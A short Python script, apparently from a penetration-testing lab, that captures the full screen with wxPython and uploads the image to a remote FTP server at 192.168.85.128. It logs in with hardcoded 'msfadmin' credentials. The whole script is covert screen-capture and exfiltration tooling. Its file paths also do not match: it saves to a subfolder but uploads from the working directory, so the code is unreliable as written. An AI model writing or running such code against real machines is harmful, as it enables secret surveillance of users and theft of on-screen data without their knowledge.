#Code to grab screenshots of localhost and upload it to the ftp servers

import wx 
import os
import ftplib 

#Code of object for wxPython
w = wx.App() 
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wx.Bitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
memo.Blit(0,0,size[0],size[1],screen,0,0)

del memo 

#Saving file onto screenshots folder
bmap.SaveFile("screenshots/grabbed.png", wx.BITMAP_TYPE_PNG)

#User credentials of ftp server
sess_ = ftplib.FTP("192.168.85.128", "msfadmin", "msfadmin")

#Storing onto that ftp server
file_ = open("grabbed.png", "rb")
sess_.storbinary("STOR /tmp/grabbed.png", file_)

file_.close()
sess_.quit()
